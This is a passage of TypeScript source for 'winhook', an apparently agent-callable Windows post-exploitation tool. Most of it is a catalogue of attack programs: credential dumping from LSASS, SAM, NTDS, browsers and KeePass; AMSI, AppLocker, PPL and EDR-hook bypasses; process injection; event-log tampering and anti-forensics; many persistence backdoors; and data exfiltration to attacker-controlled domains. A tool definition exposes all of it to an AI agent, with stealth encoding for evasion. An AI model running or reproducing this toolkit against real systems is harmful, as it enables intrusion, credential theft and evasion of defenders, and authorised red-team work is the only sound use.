      "DLL sideloading / phantom DLL hijacking for privilege escalation — exploit Windows services that load missing DLLs from writable directories. Known targets: StorSvc (SprintCSP.dll), IKEEXT (wlbsctrl.dll), NetMan (wlanhlp.dll), SessionEnv (TSMSISrv.dll), CDPSvc (cdpsgshims.dll), Wlanext (wlanext.dll), DiagHub (DataCollectors DLL)",
    args: "--action enum|exploit [--target SERVICE] [--dll DLL_PATH]",
  },
  server_operator_abuse: {
    description:
      "Abuse Server Operators group membership for privilege escalation to SYSTEM — Server Operators can start/stop services and modify service configurations on Domain Controllers. Modify an existing service's binary path to execute arbitrary commands as SYSTEM",
    args: "--action check|exploit [--service SERVICE_NAME] [--payload CMD]",
  },
  dll_hijack: {
    description:
      "DLL hijacking for privilege escalation — enumerate writable directories in system PATH, scan for known DLL hijack targets (StorSvc/SprintCSP.dll, CDPSvc/cdpsgshims.dll, DiagHub/diagtrack.dll, USO/windowscoredeviceinfo.dll, IKEEXT/wlbsctrl.dll, NetMan/wlanhlp.dll, SessionEnv/TSMSISrv.dll), check missing DLLs loaded by SYSTEM services, and optionally place a DLL payload",
    args: "--action enum|exploit [--target SERVICE_NAME] [--dll DLL_PATH]",
  },
  msi_abuse: {
    description:
      "Windows Installer (MSI) privilege escalation — check AlwaysInstallElevated registry keys, craft malicious MSI packages with custom actions for SYSTEM execution, and exploit MSI repair abuse. AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges",
    args: "--action check|craft|install [--payload CMD] [--output MSI_PATH]",
  },
  backup_operator_abuse: {
    description:
      "Abuse Backup Operators group membership for privilege escalation — use backup privilege (SeBackupPrivilege) to read protected files including SAM/SYSTEM hives and NTDS.dit via robocopy /b, diskshadow, or wbadmin. Backup Operators can read any file on the system regardless of ACLs",
    args: "--action check|dump_sam|dump_ntds [--outdir PATH] [--dc DC_HOSTNAME]",
  },
  applocker_bypass: {
    description:
      "AppLocker and WDAC bypass for execution restriction evasion — enumerate AppLocker/WDAC policy, find writable allowed directories, use LOLBAS (MSBuild, InstallUtil, Regsvr32, CMSTP, Mshta, CertUtil) for arbitrary code execution past application whitelisting. Covers all major bypass techniques",
    args: "--action enum|bypass [--method msbuild|installutil|regsvr32|cmstp|mshta|certutil|wmic|xsl] [--payload CMD] [--file PATH]",
  },
  stealth_check: {
    description:
      "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
    args: "[--mode base64|amsi|obfuscate|all]",
  },
  proxy_pivot: {
    description:
      "Network pivoting toolkit — set up SOCKS proxy for tunneling through compromised host, reverse port forwarding to expose internal services, SSH tunneling via OpenSSH client, and netsh portproxy chains. Enables access to internal network segments from external attacker position",
    args: "--action socks|reverse|ssh-tunnel|portproxy|enum [--listen-port PORT] [--target HOST:PORT] [--ssh-host HOST] [--ssh-user USER]",
  },
  event_tamper: {
    description:
      "Selective event log tampering — surgically remove specific events instead of clearing entire logs (which generates Event ID 1102). Disable specific log sources, modify audit policies to stop generating evidence, resize event logs to force rollover, and disable Sysmon. More stealthy than winhook cleanup_win full log clear",
    args: "--action selective|disable-source|audit-policy|resize|disable-sysmon [--log Security|System|Application|PowerShell] [--event-id ID] [--after DATETIME]",
  },
  cert_steal: {
    description:
      "Certificate store theft — enumerate and export certificates with private keys from local machine and current user certificate stores. Targets code signing certs, client auth certs, smart card certs, and CA certificates. Exported as PFX for pass-the-certificate attacks, S/MIME decryption, and code signing abuse",
    args: "--action enum|export [--store LocalMachine|CurrentUser|both] [--exportable-only] [--output PATH] [--password PFX_PASS]",
  },
  browser_harvest: {
    description:
      "Browser credential and data harvesting — extract saved passwords, cookies, history, bookmarks, and autofill data from Chrome, Edge, Firefox, and Brave. Uses DPAPI decryption for Chromium-based browsers and NSS library for Firefox. Supports all user profiles on the system",
    args: "--action passwords|cookies|history|bookmarks|all [--browser chrome|edge|firefox|brave|all]",
  },
  reg_secrets: {
    description:
      "Registry credential extraction — harvest stored credentials from registry: AutoLogon (DefaultPassword), WinLogon, VNC passwords, PuTTY saved sessions and SSH host keys, WinSCP stored passwords, RDP connection history, service account credentials, TeamViewer passwords, FileZilla saved servers, and custom application credential storage. Comprehensive registry-based credential sweep",
    args: "--action full|autologon|vnc|putty|winscp|rdp|services|apps",
  },
  screenshot_grab: {
    description:
      "Screen and visual capture — take screenshots of all monitors, capture active window, optional webcam snapshot via DirectShow API. Used for visual intelligence gathering and proving access during pentest engagements",
    args: "--action screen|window|webcam|all [--output PATH] [--monitor INDEX]",
  },
  share_hunt: {
    description:
      "Network share hunting — discover and enumerate SMB shares across the network, scan for sensitive files (credentials, configs, backups, scripts, databases, SSH keys, certificates), identify open/readable/writable shares, find password files in SYSVOL/NETLOGON/IT shares, detect misconfigured share permissions. Targets: specific host, subnet, or domain computers via AD query",
    args: "--action enum|hunt|sysvol|writable [--target HOST|SUBNET|domain] [--depth 1-3] [--pattern GLOB]",
  },
  data_exfil: {
    description:
      "Data exfiltration toolkit — stage and exfiltrate data through multiple channels. DNS exfiltration (encode data in DNS queries to attacker-controlled domain), HTTPS exfiltration (POST data to C2 endpoint), SMB staging (copy files to attacker share), ICMP tunneling (hide data in ICMP echo payloads), and local staging (compress and encrypt files for manual extraction). Includes file discovery for sensitive data targeting",
    args: "--action discover|stage|dns|https|smb|icmp [--target PATH] [--domain DOMAIN] [--url URL] [--share \\\\HOST\\SHARE] [--listener IP] [--password KEY]",
  },
  firewall_manage: {
    description:
      "Windows Firewall manipulation — enumerate firewall profiles and rules, disable specific profiles (Domain/Private/Public), add allow rules for inbound/outbound connections, create port forwarding rules, find and disable blocking rules, and restore firewall to previous state. Essential for enabling lateral movement and C2 communication through host-based firewall",
    args: "--action enum|disable|allow|forward|restore [--profile domain|private|public|all] [--port PORT] [--protocol tcp|udp] [--address IP] [--name RULE_NAME]",
  },
  local_recon: {
    description:
      "Local environment reconnaissance — enumerate installed software, running services, AV/EDR product detection (Defender, CrowdStrike, SentinelOne, Carbon Black, Sophos, Cylance, Trend Micro, ESET, McAfee, Symantec, Palo Alto Cortex), security tools, .NET versions, PowerShell versions, hotfixes, network interfaces, firewall profiles, and attack surface mapping. Identifies defensive products before choosing evasion strategy",
    args: "--action full|av|software|services|network|hotfixes",
  },
  ps_downgrade: {
    description:
      "PowerShell downgrade attack — force PowerShell 2.0 engine to bypass AMSI, Script Block Logging, Constrained Language Mode, and module logging. PS 2.0 predates all modern security features. Checks if .NET 2.0/3.5 and PS 2.0 engine are available, then executes commands through the v2 engine where none of these protections exist",
    args: "--action check|execute [--command CMD]",
  },
  process_inject: {
    description:
      "Process injection toolkit — inject shellcode or DLLs into legitimate processes to evade AV/EDR detection. Supports process hollowing (spawn suspended → unmap → inject → resume), APC injection (queue payload to alertable thread), thread hijacking (suspend → redirect RIP/EIP → resume), early bird injection (inject before main thread init), and DLL injection via CreateRemoteThread. Enumerate injectable processes and verify injection success",
    args: "--action enum|hollow|apc|hijack|earlybird|dll [--target PID|NAME] [--payload PATH] [--dll PATH]",
  },
  anti_forensics: {
    description:
      "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
    args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
  },
  exchange_abuse: {
    description:
      "Exchange Server exploitation — enumerate Exchange infrastructure (servers, versions, roles, virtual directories), dump Global Address List (GAL), search and export mailbox contents, plant transport rule backdoors for email interception, exploit Exchange permissions for privilege escalation (WriteDACL on domain object). Targets on-premises Exchange deployments",
    args: "--action enum|gal|search|export|transport-rule|privesc [--server EXCHANGE_HOST] [--mailbox USER] [--query KEYWORD] [--subject SUBJECT]",
  },
  win_hello_dump: {
    description:
      "Windows Hello credential extraction — enumerate and extract Windows Hello for Business NGC keys, PIN complexity requirements, biometric enrollment status, and FIDO2 security keys. Access NGC key containers (DPAPI-protected), extract PIN-derived keys for pass-the-certificate attacks, enumerate trust relationships between Windows Hello and Azure AD/on-prem AD",
    args: "--action enum|keys|pin-policy|biometric|fido [--user USERNAME]",
  },
  bitlocker_keys: {
    description:
      "BitLocker recovery key extraction — retrieve BitLocker recovery keys from Active Directory (stored in msFVE-RecoveryInformation objects), local registry, WMI, and TPM metadata. Enumerate encrypted volumes on local and remote hosts, extract recovery passwords for offline disk decryption, and check for suspended protection (cleartext keys in memory)",
    args: "--action local|ad|remote|enum [--target HOST] [--computer COMPUTER_NAME] [--volume C:]",
  },
  machine_account: {
    description:
      "Machine account operations — create, delete, and manage computer accounts in Active Directory. Abuse ms-DS-MachineAccountQuota (default: 10) to create machine accounts for RBCD attacks, relay targets, and resource-based constrained delegation chains. Check quota, create accounts with known passwords, enumerate existing machine accounts and their creators",
    args: "--action quota|create|delete|enum [--name COMPUTER_NAME] [--password PASSWORD]",
  },
  adidns_poison: {
    description:
      "AD-integrated DNS poisoning — inject, modify, or delete DNS records in Active Directory-integrated DNS zones for man-in-the-middle attacks. Enumerate zones and record permissions, add wildcard records to capture all unresolved queries, inject A records pointing to attacker IP, check ADIDNS default permissions (Authenticated Users can create records by default). Complements responder_poison for targeted MITM",
    args: "--action enum|inject|wildcard|delete|check-perms [--zone ZONE] [--name RECORD] [--ip IP] [--type A|CNAME|TXT]",
  },
  azure_ad_hybrid: {
    description:
      "Azure AD / Entra ID hybrid attack toolkit — extract Primary Refresh Tokens (PRT) for cloud session hijacking, dump Azure AD Connect credentials (sync account password hash), extract Seamless SSO Kerberos decryption key (AZUREADSSOACC$ computer account), enumerate hybrid join status, tenant info, and conditional access gaps. Critical for on-prem to cloud lateral movement in hybrid environments",
    args: "--action enum|prt|connect-creds|sso-key|token [--tenant TENANT] [--refresh-token TOKEN]",
  },
  responder_poison: {
    description:
      "LLMNR/NBT-NS/mDNS poisoning — capture NTLMv2 hashes by responding to broadcast name resolution requests on the local network. Enumerate current poisoning opportunity (LLMNR/NBT-NS enabled status), start listener for hash capture, analyze captured hashes (identify accounts, services, crackable types). The foundational red team technique for credential capture on internal networks",
    args: "--action check|poison|analyze [--interface IFACE] [--duration SECONDS] [--protocols llmnr|nbtns|mdns|all]",
  },
  ntlm_relay: {
    description:
      "NTLM relay attack toolkit — relay captured NTLM authentication to target services. Enumerate relay targets (SMB signing, LDAP signing, HTTP endpoints), configure relay listener for SMB/HTTP/LDAP/MSSQL targets, check for NTLM relay protections (EPA, channel binding, signing requirements). Complements ntlm_coerce and coercer_full which force authentication — this tool relays it",
    args: "--action enum|check|relay|targets [--target HOST] [--relay-to HOST] [--service smb|ldap|http|mssql] [--listen-port PORT]",
  },
  password_spray: {
    description:
      "Domain password spraying — test a single password against multiple domain accounts with lockout-aware throttling. Enumerates domain password policy first (lockout threshold, observation window, complexity requirements), then sprays against all enabled accounts or a target list. Supports custom user lists, automatic jitter between attempts, and lockout threshold safety margin",
    args: "--action policy|spray|status [--password PASSWORD] [--users FILE|all] [--dc DC_HOST] [--jitter SECONDS] [--threshold-margin N]",
  },
  wdigest_enable: {
    description:
      "WDigest credential caching control — enable or disable UseLogonCredential registry key to force plaintext password storage in LSASS memory. When enabled, next interactive logon caches cleartext credentials retrievable via lsass_dump. Check current status, enable for credential harvesting, disable to restore, and force re-authentication via lock screen",
    args: "--action check|enable|disable|lock [--wait-logon]",
  },
  ppl_bypass: {
    description:
      "Protected Process Light (PPL) bypass — detect RunAsPPL on LSASS, disable via vulnerable signed kernel driver (RTCore64.sys, DBUtil_2_3.sys, etc.), or use mimidrv.sys. Required before lsass_dump/nanodump_advanced on modern Windows 11/Server 2022+ where PPL is enabled by default. Checks Credential Guard (VBS) status as well",
    args: "--action check|disable|restore [--driver rtcore|dbutil|procexp|mimidrv] [--lsass-pid PID]",
  },
  bits_persist: {
    description:
      "BITS (Background Intelligent Transfer Service) persistence — create BITS transfer jobs that survive reboots and execute commands on completion. Extremely stealthy persistence mechanism used by APT29/FIN7. Supports download+execute, notify command on completion, and self-restarting jobs. Also useful for C2 callback and data exfiltration via BITS uploads",
    args: "--action create|list|delete|exfil [--name JOB_NAME] [--url URL] [--command CMD] [--local-file PATH] [--interval MINUTES]",
  },
  wsus_abuse: {
    description:
      "WSUS (Windows Server Update Services) exploitation — enumerate WSUS configuration, check for HTTP (non-SSL) WSUS connections exploitable via MITM, inject fake updates via SharpWSUS-style attacks, and enumerate update approval status. Domain-wide code execution vector when WSUS uses HTTP",
    args: "--action enum|check|inject|history [--wsus-server URL] [--payload PATH] [--target-group GROUP]",
  },
  golden_gmsa: {
    description:
      "GoldenGMSA attack — extract KDS root key from AD to compute gMSA passwords OFFLINE without DC connectivity. Different from gmsa_dump (which reads msDS-ManagedPassword directly). Enumerate KDS root keys, extract key material, compute gMSA passwords for any managed service account using the KDS derivation algorithm",
    args: "--action enum|extract|compute [--sid gMSA_SID] [--kds-key-id GUID]",
  },
  silver_saml: {
    description:
      "Silver SAML attack — forge SAML tokens using stolen ADFS/Entra ID signing certificate. Enumerate federation configuration (ADFS endpoints, relying party trusts), extract token-signing certificate, and generate forged SAML assertions for any user. Enables authentication to any federated service (O365, AWS, etc.) without touching the IdP",
    args: "--action enum|extract-cert|forge [--adfs-server HOST] [--target-user USER] [--audience URI] [--cert-path PFX_PATH]",
  },
  rdp_shadow: {
    description:
      "RDP session shadowing — shadow (view/control) active RDP sessions without user disconnection. Unlike rdp_hijack which takes over disconnected sessions, this watches live sessions in real-time for credential observation. Enumerate active sessions, shadow with/without user consent, and capture keystrokes during shadowed sessions",
    args: "--action enum|shadow|config [--session-id ID] [--control] [--no-consent]",
  },
  print_monitor_persist: {
    description:
      "Print Monitor/Port Monitor persistence — register a custom DLL as a print monitor or port monitor that loads at SYSTEM level when the Print Spooler service starts. One of the stealthiest persistence mechanisms — survives reboots, runs as SYSTEM, rarely detected by EDR. Enumerate existing monitors, register new monitor DLL, or clean up",
    args: "--action enum|install|remove [--name MONITOR_NAME] [--dll DLL_PATH] [--type monitor|port]",
  },
  clm_bypass: {
    description:
      "Constrained Language Mode (CLM) bypass — escape PowerShell CLM restrictions using multiple techniques: custom .NET runspace, MSBuild inline tasks, InstallUtil, XSLT transforms, Add-Type with in-memory compilation. More comprehensive than ps_downgrade (PS 2.0 only). Check current language mode, attempt bypass, execute arbitrary PowerShell in FullLanguage mode",
    args: "--action check|bypass|execute [--method runspace|msbuild|installutil|xslt|addtype] [--command CMD] [--script-path PATH]",
  },
  ssp_persist: {
    description:
      "Security Support Provider (SSP) persistence — register a custom SSP DLL that loads into LSASS and captures ALL plaintext credentials on every logon (interactive, network, service). More powerful than WDigest (captures every auth type). Uses AddSecurityPackage API (instant, no reboot) or registry (survives reboot). Enumerate existing SSPs, install, and remove",
    args: "--action enum|install|remove [--dll DLL_PATH] [--name SSP_NAME] [--method api|registry]",
  },
  password_filter: {
    description:
      "Password filter DLL persistence — register a custom notification DLL that receives plaintext passwords on EVERY password change (user-initiated, admin reset, group policy). Loaded by LSASS via LSA Notification Packages registry key. Complements ssp_persist (SSP captures logons, this captures password changes). Enumerate, install, and remove",
    args: "--action enum|install|remove [--dll DLL_PATH] [--name FILTER_NAME]",
  },
  dsrm_abuse: {
    description:
      "Directory Services Restore Mode (DSRM) abuse — exploit the local DSRM administrator account on Domain Controllers for persistent backdoor access. Check DSRM password status, set DsrmAdminLogonBehavior to allow network logon (value 2), sync DSRM password with a domain account. Stealthier than skeleton_key and survives reboots",
    args: "--action check|enable-network|sync-password|disable [--sync-account ACCOUNT]",
  },
  ntlmv1_downgrade: {
    description:
      "NTLMv1 authentication downgrade — force NTLMv1 responses by modifying LmCompatibilityLevel registry value. NTLMv1 hashes crack instantly (rainbow tables / DES key space) vs NTLMv2 which requires bruteforce. Combine with ntlm_coerce/coercer_full to capture easily-crackable hashes. Check current level, downgrade, and restore",
    args: "--action check|downgrade|restore [--level 0|1|2] [--target HOST]",
  },
  accessibility_backdoor: {
    description:
      "Accessibility features backdoor — replace sethc.exe (Sticky Keys), utilman.exe (Utility Manager), narrator.exe, or osk.exe with cmd.exe for SYSTEM shell at the Windows login screen. Press Shift 5 times (sethc) or Win+U (utilman) at RDP login to get SYSTEM. Classic persistence technique, works without Credential Guard",
    args: "--action check|install|remove [--target sethc|utilman|narrator|osk|magnify] [--payload CMD_PATH]",
  },
  ifeo_persist: {
    description:
      "Image File Execution Options (IFEO) debugger persistence — set a debugger for any executable so your payload runs instead when the target process launches. Supports standard debugger key (visible) and SilentProcessExit monitoring (stealthier, triggers on process exit). Enumerate existing IFEO entries, install, and remove",
    args: "--action enum|install|remove [--target PROCESS.exe] [--payload PATH] [--method debugger|silent-exit]",
  },
  rid_hijack: {
    description:
      "RID hijacking — modify a user's Relative Identifier in the SAM registry to 500 (Administrator) for hidden privilege escalation. The user appears normal in net user output but has full admin rights. Enumerate RIDs, hijack, and restore",
    args: "--action enum|hijack|restore [--user USERNAME] [--rid NUMBER]",
  },
  winlogon_persist: {
    description:
      "Winlogon Helper DLL persistence — modify Shell, Userinit, or Notify registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. Payloads execute at every user logon in SYSTEM context. Enumerate current values, install, and restore",
    args: "--action enum|install|restore [--key shell|userinit|notify] [--payload PATH]",
  },
  appinit_dll: {
    description:
      "AppInit_DLLs persistence — register a DLL that gets loaded into every process that loads User32.dll (virtually all GUI applications). Mass injection via registry key. Enumerate, install, and remove",
    args: "--action enum|install|remove [--dll PATH] [--scope machine|wow64]",
  },
  netsh_helper: {
    description:
      "Netsh Helper DLL persistence — register a DLL as a netsh.exe helper that loads whenever netsh is invoked. Common in admin workflows (firewall, network config). Enumerate existing helpers, install, and remove",
    args: "--action enum|install|remove [--dll PATH] [--name HELPER_NAME]",
  },
  time_provider: {
    description:
      "Windows Time Provider DLL persistence — register a DLL as a W32Time service time provider. Runs in SYSTEM context as part of the Windows Time service. Very stealthy — time providers are rarely audited. Enumerate, install, and remove",
    args: "--action enum|install|remove [--dll PATH] [--name PROVIDER_NAME]",
  },
  screensaver_persist: {
    description:
      "Screensaver persistence — set a payload as the screensaver executable via SCRNSAVE.EXE registry key. Triggers when the user is idle (configurable timeout). Per-user persistence, no admin required. Enumerate, install, and remove",
    args: "--action enum|install|remove [--payload PATH] [--timeout SECONDS]",
  },
  teams_token: {
    description:
      "Microsoft Teams token and data extraction — discover Teams installations (Classic Electron vs New WebView2), extract JWT access tokens and Skype tokens from LevelDB storage, enumerate Token Broker cache for new Teams, and extract chat history, contacts, attachments from IndexedDB. Teams Classic stores tokens in plaintext LevelDB; New Teams uses DPAPI-encrypted Token Broker",
    args: "--action enum|tokens|chats|full",
  },
  mitm6: {
    description:
      "IPv6 DHCPv6 DNS takeover (mitm6-style) — assess vulnerability to DHCPv6 spoofing by checking IPv6 status on all interfaces, DHCPv6 client, DNS config, and WPAD resolution. Poison mode configures DHCPv6 DNS poisoning to redirect name resolution to attacker. IPv6 is enabled by default on Windows but rarely used, making it a reliable MITM vector. Combine with ntlm_relay for domain compromise",
    args: "--action check|poison [--domain DOMAIN] [--relay TARGET_HOST] [--interface IFACE]",
  },
  wpad_abuse: {
    description:
      "WPAD proxy auto-detection abuse — check if WPAD AutoDetect is enabled (default on Windows), verify wpad DNS resolution, analyze proxy settings, and generate PAC files for NTLM credential interception. WPAD is enabled by default and clients actively query for the wpad host. Combine with adidns_poison or responder_poison to serve malicious PAC",
    args: "--action check|serve",
  },
  ppid_spoof: {
    description:
      "Parent PID spoofing — create processes with a fake parent PID via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to evade EDR parent-child process tree analysis. Enum mode lists candidate parents (explorer, svchost, RuntimeBroker, winlogon, services). Spoof mode creates a new process appearing as a child of the chosen parent",
    args: "--action enum|spoof [--parent PROCESS_NAME] [--command CMD]",
  },
  unhook_ntdll: {
    description:
      "NTDLL unhooking — detect and remove EDR userland hooks from ntdll.dll. Check mode scans 18 critical Nt* functions (NtWriteVirtualMemory, NtCreateThreadEx, NtAllocateVirtualMemory, etc.) for JMP/PUSH+RET/INT3 hook patterns. Unhook mode loads a fresh ntdll.dll from disk via NtCreateSection+NtMapViewOfSection and overwrites the hooked .text section with the clean copy. Essential pre-step before process_inject, lsass_dump, or token_impersonate on EDR-protected hosts",
    args: "--action check|unhook",
  },
  powershell_profile: {
    description:
      "PowerShell profile persistence — enumerate all $PROFILE locations (CurrentUser/AllUsers x CurrentHost/AllHosts), check write permissions, detect suspicious existing content, and install payload that executes on every PowerShell session start. No admin required for current-user profiles. Works in PowerShell, ISE, VS Code, Windows Terminal",
    args: "--action enum|install|remove [--payload COMMAND] [--scope current|all]",
  },
  active_setup: {
    description:
      "Active Setup registry persistence — register a StubPath command under HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components that executes ONCE per user at their next logon (before Explorer shell). Changing Version forces re-execution for all users. Enumerate existing entries, install, and remove",
    args: "--action enum|install|remove [--payload CMD] [--name GUID_NAME]",
  },
  boot_exec: {
    description:
      "BootExecute early boot persistence — add native executable to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute. Runs BEFORE Win32 subsystem, services, and user logon — earliest possible execution point. Only native API executables (no Win32). Enumerate, install, and restore to default",
    args: "--action enum|install|remove [--payload NATIVE_EXE_NAME]",
  },
  schtask_exec: {
    description:
      "Remote scheduled task lateral movement — enumerate remote host tasks, test task creation permissions, and execute commands as SYSTEM via schtasks.exe /Create /S. Creates task, runs it, retrieves output via UNC path, and auto-cleans. Different from schtask_persist (local persistence) — this is for remote code execution",
    args: "--action enum|exec --target HOST --command CMD [--user USER] [--password PASS] [--name TASK_NAME]",
  },
  ssh_exec: {
    description:
      "SSH lateral movement via Windows built-in OpenSSH (Win10 1803+) — enumerate SSH client/server status, discover private keys and known_hosts for target mapping, SSH config entries, other users' keys, and execute remote commands via key or password authentication",
    args: "--action enum|exec --target HOST --command CMD [--user USER] [--password PASS] [--key KEY_PATH]",
  },
  keepass_dump: {
    description:
      "KeePass credential extraction — discover KeePass installations and .kdbx database files, extract master password from memory via CVE-2023-32784 (.NET TextBox CLR string residue in KeePass 2.x < 2.54), and analyze trigger system configuration for credential export injection. Works against KeePass 2.x; KeePassXC is NOT vulnerable to memory attack",
    args: "--action enum|memory|trigger|full",
  },
  lsa_secrets: {
    description:
      "Extract LSA secrets from SECURITY registry hive — service account plaintext passwords (_SC_ entries), machine account password ($MACHINE.ACC), DPAPI system master key, NL$KM cached credential encryption key, AutoLogon DefaultPassword. Complements sam_dump (SAM only) and cached_creds (DCC2 only). In-memory decryption via LsaRetrievePrivateData or offline via secretsdump",
    args: "--action dump|decrypt [--outdir PATH]",
  },
  pipe_enum: {
    description:
      "Named pipe enumeration — discover all named pipes on the system, identify security-relevant pipes (LSASS, Spooler, EFS, Netlogon, SMB, RDP), check pipe ACLs for impersonation opportunities, and find custom/non-standard pipes that may indicate C2 frameworks or third-party applications with weak permissions",
    args: "--action enum|acl|custom|full [--filter PATTERN]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS

const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
  lsass_dump: lsassDump,
  sam_dump: samDump,
  dpapi_extract: dpapiExtract,
  credential_prompt: credentialPrompt,
  keylog_win: keylogWin,
  etw_process: etwProcess,
  etw_network: etwNetwork,
  clipboard_sniff: clipboardSniff,
  amsi_bypass: amsiBypass,
  etw_blind: etwBlind,
  defender_exclude: defenderExclude,
  cleanup_win: cleanupWin,
  ad_enum: adEnum,
  bloodhound_collect: bloodhoundCollect,
  laps_dump: lapsDump,
  gpo_enum: gpoEnum,
  ad_dns_enum: adDnsEnum,
  kerberoast: kerberoast,
  asreproast: asreproast,
  golden_ticket: goldenTicket,
  silver_ticket: silverTicket,
  delegation_abuse: delegationAbuse,
  overpass_hash: overpassHash,
  pass_the_ticket: passTheTicket,
  dcsync: dcsync,
  dcshadow: dcshadow,
  skeleton_key: skeletonKey,
  ad_acl_abuse: adAclAbuse,
  adcs_abuse: adcsAbuse,
  shadow_creds: shadowCreds,
  sid_history: sidHistory,
  dns_admin_abuse: dnsAdminAbuse,
  wmi_exec: wmiExec,
  winrm_exec: winrmExec,
  dcom_exec: dcomExec,
  smb_exec: smbExec,
  ntlm_coerce: ntlmCoerce,
  mssql_abuse: mssqlAbuse,
  schtask_persist: schtaskPersist,
  service_persist: servicePersist,
  registry_persist: registryPersist,
  wmi_persist: wmiPersist,
  com_hijack: comHijack,
  startup_persist: startupPersist,
  token_impersonate: tokenImpersonate,
  uac_bypass: uacBypass,
  potato_attack: potatoAttack,
  printspooler_abuse: printspoolerAbuse,
  ntds_dump: ntdsDump,
  dpapi_domain: dpapiDomain,
  cached_creds: cachedCreds,
  mssql_creds: mssqlCreds,
  wifi_dump: wifiDump,
  vault_dump: vaultDump,
  sccm_abuse: sccmAbuse,
  gpo_abuse: gpoAbuse,
  nopac: nopac,
  zerologon: zerologon,
  certifried: certifried,
  bad_successor: badSuccessor,
  bronze_bit: bronzeBit,
  adcs_esc_advanced: adcsEscAdvanced,
  coercer_full: coercerFull,
  rdp_hijack: rdpHijack,
  token_stomp: tokenStomp,
  adws_recon: adwsRecon,
  laps_v2_decrypt: lapsV2Decrypt,
  primary_group_abuse: primaryGroupAbuse,
  cross_forest: crossForest,
  diamond_ticket: diamondTicket,
  sapphire_ticket: sapphireTicket,
  krbrelayup: krbrelayup,
  unpac_hash: unpacHash,
  golden_cert: goldenCert,
  pass_the_cert: passTheCert,
  gmsa_dump: gmsaDump,
  adminsdholder: adminsdholder,
  rbcd_chain: rbcdChain,
  remote_monologue: remoteMonologue,
  nanodump_advanced: nanodumpAdvanced,
  privilege_abuse: privilegeAbuse,
  stored_creds_abuse: storedCredsAbuse,
  named_pipe_privesc: namedPipePrivesc,
  always_install_elevated: alwaysInstallElevated,
  shadow_copy_abuse: shadowCopyAbuse,
  unquoted_service_path: unquotedServicePath,
  wsl_privesc: wslPrivesc,
  scheduled_task_hijack: scheduledTaskHijack,
  byovd: byovd,
  weak_service_perms: weakServicePerms,
  dll_sideload: dllSideload,
  server_operator_abuse: serverOperatorAbuse,
  dll_hijack: dllHijack,
  msi_abuse: msiAbuse,
  backup_operator_abuse: backupOperatorAbuse,
  applocker_bypass: applockerBypass,
  stealth_check: stealthCheck,
  proxy_pivot: proxyPivot,
  event_tamper: eventTamper,
  cert_steal: certSteal,
  browser_harvest: browserHarvest,
  reg_secrets: regSecrets,
  screenshot_grab: screenshotGrab,
  share_hunt: shareHunt,
  data_exfil: dataExfil,
  firewall_manage: firewallManage,
  local_recon: localRecon,
  ps_downgrade: psDowngrade,
  process_inject: processInject,
  anti_forensics: antiForensics,
  wdigest_enable: wdigestEnable,
  password_spray: passwordSpray,
  ntlm_relay: ntlmRelay,
  responder_poison: responderPoison,
  azure_ad_hybrid: azureAdHybrid,
  adidns_poison: adidnsPoison,
  machine_account: machineAccount,
  bitlocker_keys: bitlockerKeys,
  win_hello_dump: winHelloDump,
  exchange_abuse: exchangeAbuse,
  ppl_bypass: pplBypass,
  bits_persist: bitsPersist,
  wsus_abuse: wsusAbuse,
  golden_gmsa: goldenGmsa,
  silver_saml: silverSaml,
  rdp_shadow: rdpShadow,
  print_monitor_persist: printMonitorPersist,
  clm_bypass: clmBypass,
  ssp_persist: sspPersist,
  password_filter: passwordFilter,
  dsrm_abuse: dsrmAbuse,
  ntlmv1_downgrade: ntlmv1Downgrade,
  accessibility_backdoor: accessibilityBackdoor,
  ifeo_persist: ifeoPersist,
  rid_hijack: ridHijack,
  winlogon_persist: winlogonPersist,
  appinit_dll: appinitDll,
  netsh_helper: netshHelper,
  time_provider: timeProvider,
  screensaver_persist: screensaverPersist,
  teams_token: teamsToken,
  mitm6: mitm6Attack,
  wpad_abuse: wpadAbuse,
  ppid_spoof: ppidSpoof,
  unhook_ntdll: unhookNtdll,
  powershell_profile: powershellProfile,
  active_setup: activeSetup,
  boot_exec: bootExec,
  schtask_exec: schtaskExec,
  ssh_exec: sshExec,
  keepass_dump: keepassDump,
  lsa_secrets: lsaSecrets,
  pipe_enum: pipeEnum,
}

export const WinhookTool = Tool.define("winhook", {
  description: `Execute a Windows post-exploitation program. Covers Active Directory (enumeration, Kerberos attacks, DCSync, ADCS, delegation abuse), lateral movement (WMI, WinRM, DCOM, SMB, NTLM relay), persistence (scheduled tasks, services, registry, WMI subscriptions, COM hijacking), privilege escalation (token impersonation, UAC bypass, Potato attacks), and credential harvesting (LSASS, SAM, DPAPI, NTDS.dit, Vault, SCCM). Requires Administrator privileges on the target. Available programs: ${Object.keys(PROGRAMS).join(", ")}. No kernel driver signing needed — all techniques use userland APIs (PowerShell + Add-Type C#). ALWAYS run cleanup_win before leaving a target.`,
  parameters: z.object({
    program: z.enum(Object.keys(PROGRAMS) as [string, ...string[]]).describe(
      "Windows post-exploitation program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z
      .array(z.string())
      .describe(
        "Arguments to pass to the program. Use --stealth <mode> for AV/EDR evasion: base64 (EncodedCommand), amsi (AMSI patch + Base64), obfuscate (string chunking + IEX + Base64)",
      ),
    timeout_seconds: z.number().optional().default(120).describe("Maximum execution time in seconds (default: 120)"),
  }),
  async execute(params) {
    if (process.platform !== "win32") {
      return {
        title: `winhook: ${params.program}`,
        output: `winhook requires Windows. Current platform: ${process.platform}\n\nUse 'ebpf' for Linux post-exploitation or 'machook' for macOS.`,
        metadata: { program: params.program, findings: [] as Finding[] },
      }
